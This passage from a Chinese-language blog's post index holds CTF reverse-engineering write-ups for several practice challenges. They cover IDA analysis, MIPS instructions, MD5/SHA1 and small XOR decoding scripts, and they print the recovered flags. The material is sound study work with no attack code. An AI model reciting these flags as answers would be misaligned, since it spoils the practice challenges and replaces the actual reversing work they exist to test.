add(v3, <span class="number">1000000000</span>);</span><br><span class="line">  v10[<span class="number">21</span>]=sub(v3, <span class="number">1000000000</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">22</span>], <span class="number">49</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">2</span>);</span><br><span class="line">  v10[<span class="number">22</span>]=sub(v3, <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v10[<span class="number">23</span>], <span class="number">10</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">5</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">8</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">9</span>);</span><br><span class="line">  v10[<span class="number">23</span>]=add(v3, <span class="number">48</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">24</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">3</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">6</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">6</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">6</span>);</span><br><span class="line">  v10[<span class="number">24</span>]=add(v3, <span class="number">20</span>);</span><br><span class="line">  v3 = add(v10[<span class="number">25</span>], <span class="number">55</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">33</span>);</span><br><span class="line">  v3 = add(v3, <span class="number">44</span>);</span><br><span class="line">  v3 = sub(v3, <span class="number">11</span>);</span><br><span class="line">  v10[<span class="number">25</span>]=add(v3, <span class="number">42</span>);</span><br><span class="line">  v10[<span class="number">26</span>]=add(v10[<span class="number">26</span>], v10[<span class="number">25</span>]);</span><br><span class="line">  v10[<span class="number">27</span>]=add(v10[<span class="number">27</span>], v10[<span class="number">12</span>]);</span><br><span class="line">  v4 = v10[<span class="number">27</span>];</span><br><span class="line">  v3 = sub(v10[<span class="number">28</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = add(v3, v4);</span><br><span class="line">  v10[<span class="number">28</span>]=sub(v3, <span class="number">1</span>);</span><br><span class="line">  v5 = v10[<span class="number">23</span>];</span><br><span class="line">  v3 = sub(v10[<span class="number">29</span>], <span class="number">1</span>);</span><br><span class="line">  v3 = mul(v3, <span class="number">1000000</span>);</span><br><span class="line">  v10[<span class="number">29</span>]=add(v3, v5);</span><br><span class="line">  v6 = v10[<span class="number">27</span>];</span><br><span class="line">  v3 = add(v10[<span class="number">30</span>], <span class="number">1</span>);</span><br><span class="line">  v10[<span class="number">30</span>]=mul(v3, v6);</span><br><span class="line">  v10[<span class="number">31</span>]=add(v10[<span class="number">31</span>], v10[<span class="number">30</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;CTF&#123;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (v10[j]));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&#125;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挺麻烦的，不过坚持下来时能够成功的。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>这道题主要是考察我们对于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">-1</span></span><br><span class="line">b = <span class="number">123</span></span><br><span class="line"><span class="keyword">while</span>(a)</span><br><span class="line">&#123;</span><br><span class="line">a--;</span><br><span class="line">b--;</span><br><span class="line">&#125;<span class="comment">//函数部分</span></span><br></pre></td></tr></table></figure><p>这个其实就是如同一个时钟，负数和正数在一个点，0和-0在一个点，构成一个圆圈，好像一个时钟。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1434108496&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackme &amp; re-for-50-plz-50 &amp; dmd-50</title>
      <link href="posts/ab329a96/"/>
      <url>posts/ab329a96/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><p>首先我们来看看这到题的一些信息（第一步都是这样的）：<br><img src="https://img-blog.csdnimg.cn/20201229185517815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们现在就知道了它是个64位的ELF文件（在计算机科学中，是一种用于二进制文件、可执行文件、目标代码、共享库和核心转储格式文件）<br>此时我们就可以用ida打开来进行我们的静态分析了。我们再ida的界面里发现了Function name是看不到main函数的，那此时我们就可以从搜索字符串里面来找到main函数。<br><img src="https://img-blog.csdnimg.cn/20201229190348381.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就靠这个来跳转到mian函数（ida里面并不是main函数，它实际上就是我们要找到函数）：<br><img src="https://img-blog.csdnimg.cn/20201229190608298.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们分析此函数，发现了输入的有22位，再仔细一分析，发现了一些奇怪的一些东西，sub_406D90这个函数（不要点进去看），发现其实没有用，你点进去看看就不想看了，所以判断无用，而后面都是由v6 % 22这个整体来实现的，那我们就默认它从0开始到22呗。<br><img src="https://img-blog.csdnimg.cn/20201229192503254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>并且我们还发现了byte_6B4270这个，追踪一下就可以发现它是个数组，和它的值（至关重要）<br>我们又仔细分析了一番函数，发现其中的规律，由此来写个脚本：<br><img src="https://img-blog.csdnimg.cn/20201229193445636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>&amp;0xff：<br>首先我们要都知道, &amp;表示按位与,只有两个位同时为1,才能得到1, 0x代表16进制数,0xff表示的数二进制1111 1111 占一个字节.和其进行&amp;操作的数,最低8位,不会发生变化.<br>正好再本题种对应着unsigned __int8这个代码。</p><hr /><h1 id="re-for-50-plz-50"><a href="#re-for-50-plz-50" class="headerlink" title="re-for-50-plz-50"></a>re-for-50-plz-50</h1><p>先来看看这个文件信息，这都是老生常谈了。<br><img src="https://img-blog.csdnimg.cn/2020122919444024.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>没有什么太大的信息，此时我们再用ida打开它，去分析里面的一些内容。<br>此时我们就可以发现了一些于其它地方不同的，它的main函数没有办法去反编译，此时可以看到它是个MIPS，这个没办法去反编译，不过也不是完全不能反编译的，这需要一个插件。<br>先来讲讲这个插件的安装，可以到github里面找到：<br><a href="https://github.com/avast/retdec-idaplugin/releases">点我！！！找插件，第二个哟！</a><br>接下来安装retdec本体。并解压到IDA插件目录（X:\IDA_Pro_v7.0\plugins）里。<br>还得安装Visual C++ Redistributable for Visual Studio 2015这个东西<br>等等·，这看起来就比较麻烦，而且我自己亲自试了试，环境一直佩不好（VS 不怎么喜欢用，用起来也不怎么方便）<br>那我们就需要会看懂MIPS指令了（其实只要看懂几个就行了）<br><img src="https://img-blog.csdnimg.cn/20201229203717866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>此时我们就可以开始编写脚本了。<br><img src="https://img-blog.csdnimg.cn/20201229204405360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>这样我们就得到了答案，这道题主要考察的是对MIPS指令的熟悉程度，如果没见过那就要卡很长时间了。</p><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>ADDIU ADDIU rt, rs, immediate 无溢出检测的带立即数的加法<br>LW LW rt, offset(base) 加载字<br>LB LB rt, offset(base) 8位加载<br>SLL SLL rd, rt, sa 逻辑左移 GPR[rd] ← GPR[rt] &lt;&lt; sa， sa为常量 取值0-31<br>ADDI ADDI  rd,rs,immediate 带立即数的加法<br>XORI XORI rt, rs, immediate 异或立即数 rt = rs ^ immediate</p><hr /><h1 id="dmd-50"><a href="#dmd-50" class="headerlink" title="dmd-50"></a>dmd-50</h1><p>刚开始还是老样子了，看看文件的信息：<br><img src="https://img-blog.csdnimg.cn/20201229204855125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们就用ida64位打开去看看里面的伪代码，是可以发现它是C++的语言写的，如果有点C++基础的话会好一点的。<br><img src="https://img-blog.csdnimg.cn/20201229205341269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而上面我们又发现了个MD5：<br><img src="https://img-blog.csdnimg.cn/2020122920570244.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201229205746349.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>给了个grape（葡萄）这是由两次MD5加密的，而我们分析上面的代码，是经过一次md5加密的。<br><img src="https://img-blog.csdnimg.cn/20201229210343410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样我们不就得到了flag了。</p><h3 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h3><p>MD5信息摘要算法（英语：MD5 Message-Digest Algorithm），一种被广泛使用的密码散列函数，可以产生出一个128位（16字节）的散列值（hash value），用于确保信息传输完整一致。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1501170103&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elrond32 &amp; answer_to_everything &amp; Reversing-x64Elf-100</title>
      <link href="posts/e62c39c4/"/>
      <url>posts/e62c39c4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h1><p>刚开始用个PE去看看文件的一些信息（一般做题如果题目没有提示带壳，我是不会用这个的，现在用只是说明一下，不过还是用一下比较好）<br><img src="https://img-blog.csdnimg.cn/20201225200754883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>32位的ELF的Linus的可执行文件，用ida打开：<br><img src="https://img-blog.csdnimg.cn/20201225201317804.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而点进去看看，发现switch里面的case都会跳转到LABEL_19:<br>那我们就看看LABEL_19:这里是个什么：<br><img src="https://img-blog.csdnimg.cn/20201225202309629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就可以写个脚本呗：<br><img src="https://img-blog.csdnimg.cn/20201225210954585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>但此时还没完，返回主函数发现还有个函数没解决sub_8048538((int)a2[1]);<br><img src="https://img-blog.csdnimg.cn/20201225203645233.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那此时我们再来个脚本呗：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">105</span>,<span class="number">115</span>,<span class="number">101</span>,<span class="number">110</span>,<span class="number">103</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">100</span>,<span class="number">0</span>]</span><br><span class="line">b = [<span class="number">0x0F</span>,<span class="number">0x1F</span>,<span class="number">0x04</span>,<span class="number">0x09</span>,<span class="number">0x1C</span>,<span class="number">0x12</span>,<span class="number">0x42</span>,<span class="number">0x09</span>,<span class="number">0x0C</span>,<span class="number">0x44</span>,<span class="number">0x0D</span>,<span class="number">0x07</span>,<span class="number">0x09</span>,<span class="number">0x06</span>,<span class="number">0x2D</span>,<span class="number">0x37</span>,<span class="number">0x59</span>,<span class="number">0x1E</span>,<span class="number">0x00</span>,<span class="number">0x59</span>,<span class="number">0x0F</span>,<span class="number">0x08</span>,<span class="number">0x1C</span>,<span class="number">0x23</span>,<span class="number">0x36</span>,<span class="number">0x07</span>,<span class="number">0x55</span>,<span class="number">0x02</span>,<span class="number">0x0C</span>,<span class="number">0x08</span>,<span class="number">0x41</span>,<span class="number">0x0A</span>,<span class="number">0x14</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    print(<span class="built_in">chr</span>(b[i] ^ a[i%<span class="number">8</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样flag就得到了flag{s0me7hing_S0me7hinG_t0lki3n}<br>这道题还可以，都是比较简单的，最主要的是有个数据的传递，写了两个脚本。<br>知识点：<br>还是考的是ida里面的分析能力，前面其实讲的很清楚了。</p><hr /><h1 id="answer-to-everything"><a href="#answer-to-everything" class="headerlink" title="answer_to_everything"></a>answer_to_everything</h1><p>首先我们可以很轻松的找到主函数，此时我们就可以分析里面的内容了：<br><img src="https://img-blog.csdnimg.cn/2020122820044817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>而这时我们会发现的确什么也没有，那这时我们可以通过搜索字符串看看有没有我们没有发现的隐藏的其它函数，这里是没有找到的，那我们可以从Function name里面找，这里函数也不多。所以都看看，就能找到了。<br>找到了__int64 deregister_tm_clones()这个东西，有点可疑，但还是什么都没有发现，返回主函数再来看看not_the_flag这个函数：<br><img src="https://img-blog.csdnimg.cn/20201228201559344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现了这个小小角落里的东西，那我们就用sha1加密一下：<br><img src="https://img-blog.csdnimg.cn/2020122820171568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这便是我们想要的flag了。</p><hr /><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>安全散列算法（英语：Secure Hash Algorithm，缩写为SHA）是一个密码散列函数家族，是FIPS所认证的安全散列算法。能计算出一个数字消息所对应到的，长度固定的字符串（又称消息摘要）的算法。且若输入的消息不同，它们对应到不同字符串的机率很高。<br>SHA家族的五个算法，分别是SHA-1、SHA-224、SHA-256、SHA-384，和SHA-512。</p><p>我们大致了解一下这个加密，以后再遇到了就有了思路。</p><hr /><h1 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h1><p>这道题还是很好找到主函数的，应该是考察我们的分析能力的（这种是比较常见的）<br><img src="https://img-blog.csdnimg.cn/20201228203546649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那我们就点进去看看这个函数sub_4006FD：<br><img src="https://img-blog.csdnimg.cn/20201228203739207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个时候我们基本上就已经摸清了这道题了，该写出这个脚本了。<br><img src="https://img-blog.csdnimg.cn/20201228204848636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里就做出这道题了，再来复盘下，分析，脚本（两个考验基本功的地方），所以我们要再这两个地方加强练习。</p><h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><p>有个小知识（大家可能会迷糊）有时候我们会将一个值逆序储存来用，而像这道题却不用。这时因为计算机储存一个值时逆过来储存的，运算也一样。想一下，你输入一个值，逆序的进去，再逆序的出来，这样在屏幕上还是正序，不过用反编译的话，是表示在计算机里面的值，所以是逆序，而我们要拿出来用的话，就需要手动（或脚本）逆序一下，而这道题，只是用它来运算，不用再逆序一下了。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=548823605&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shuffle &amp; srm-50 &amp; Mysterious</title>
      <link href="posts/d63ad51c/"/>
      <url>posts/d63ad51c/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="Shuffle"><a href="#Shuffle" class="headerlink" title="Shuffle"></a>Shuffle</h1><p>首先拖进ida去查看伪代码，那就要找到伪代码，按常规操作：搜索字符串，跳转，F5伪代码。而这题我们可以看到字符串是没有我们想要的一些字符出现，而我们可以直接在左边里找到main函数，F5就能看到伪代码。<br><img src="https://img-blog.csdnimg.cn/20201224192021309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>伪代码也有些长，我们直接看最后，结合着题目所给的提示：<br><img src="https://img-blog.csdnimg.cn/20201224192202333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码如下：<img src="https://img-blog.csdnimg.cn/20201224192324963.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>那我们就分析一下，它这么个for体，因为有个随机，我们是不好判断其中最后的输出方式，而我们可以直接去看看原始数据，就能发现<br><img src="https://img-blog.csdnimg.cn/20201224192905543.png" alt="在这里插入图片描述"><br>整理一下就可以了：SECCON{Welcome to the SECCON 2014 CTF!}</p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p>这道题没什么太多知识点，这道题可以说是让我们认识了一下reverse，以及ida的一些简单的操作。<br>又整理一下ida快捷键的操作，这些是必用的。</p><hr /><p>a：将数据转换为字符串</p><p>f5：一键反汇编</p><p>esc：回退键，能够倒回上一部操作的视图（只有在反汇编窗口才是这个作用，如果是在其他窗口按下esc，会关闭该窗口）</p><p>shift+f12：可以打开string窗口，一键找出所有的字符串，右击setup，还能对窗口的属性进行设置</p><p>ctrl+w：保存ida数据库</p><p>ctrl+s：选择某个数据段，直接进行跳转</p><p>ctrl+鼠标滚轮：能够调节流程视图的大小</p><p>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用</p><p>g：直接跳转到某个地址</p><p>n：更改变量的名称</p><p>y：更改变量的类型</p><p>/ ：在反编译后伪代码的界面中写下注释</p><p>\：在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述，有时候变量特别多的时候隐藏掉类型描述看起来会轻松很多</p><p>；：在反汇编后的界面中写下注释</p><p>ctrl+shift+w：拍摄IDA快照</p><p>u：undefine，取消定义函数、代码、数据的定义</p><hr /><h1 id="srm-50"><a href="#srm-50" class="headerlink" title="srm-50"></a>srm-50</h1><p>先下载，打开发现：<br><img src="https://img-blog.csdnimg.cn/20201224193936931.png" alt="在这里插入图片描述"><br>它让我们输入e-mali地址，和密码。那我们就用ida打开去看看里面是怎么运行的。<br>那我们用ida打开，可以在Function name这里看到：<br><img src="https://img-blog.csdnimg.cn/20201224194451429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时我们就能看到伪代码了！<br><img src="https://img-blog.csdnimg.cn/202012241947119.png" alt="在这里插入图片描述"><br>那我们就去看看这个关键函数：<br><img src="https://img-blog.csdnimg.cn/20201224195207119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后粗略分析了一下，就能得知这两个判断是很终重要的。一个是告诉了我们e-mali，另一个告诉我们了密码：<br><img src="https://img-blog.csdnimg.cn/2020122420011184.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这样flag就出来了，不过密码需要我们去一个一个连接起来的。</p><h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><p>这道题的其实也没什么知识点的，用的还是ida，主要在于分析代码，找到这两个判断。</p><hr /><h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>这道题其实在各个平台都基本能见到（无非换个flag）。<br>界面如下：<br><img src="https://img-blog.csdnimg.cn/20201225194916612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>来看主函数（ida打开）：<br>当然，你可以找字符串，就能直接找到我们想要的函数，如果直接到了主函数，需要我们一个一个点进函数里面，发现我们i想要的函数（这里就有点像t套娃，一个盒子接着一个盒子，所以题目所一个盒子吗）直接上目标函数：<br><img src="https://img-blog.csdnimg.cn/2020122519571542.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>到这里是有两种方法。一个直接看flag，分析flag由什么组成。另一个分析输入什么能满足条件（因为条件满足了，下面的语句就执行了）<br>可以看到_itoa这个函数，就是个复制，如果看上面的话，就是输入满组v10，v12，v14，v13就行了。这里要注意v10其实是加上了1，看前面的语句。<br><img src="https://img-blog.csdnimg.cn/20201225200217984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25qaDE4NzkwODE2NjM5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这道题其实没什么知识点补充的，还是分析！！！</p><h3 id="知识点：-2"><a href="#知识点：-2" class="headerlink" title="知识点："></a>知识点：</h3><p>itoa是广泛使用的非标准C语言和C++语言扩展功能。但因为它是一个非标准的C / C++语言功能,因此不能好好的被所有编译器使用。在大多数Windows下的编译器通常在<cstdlib>头文件包含非标准函数。itoa()函数把整数转换成字符串，并返回指向转换后的字符串的指针。</p><hr /><p>望诸君共勉！</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%">  <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1805114266&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新一轮pwn来了</title>
      <link href="posts/f15636a8/"/>
      <url>posts/f15636a8/</url>
      
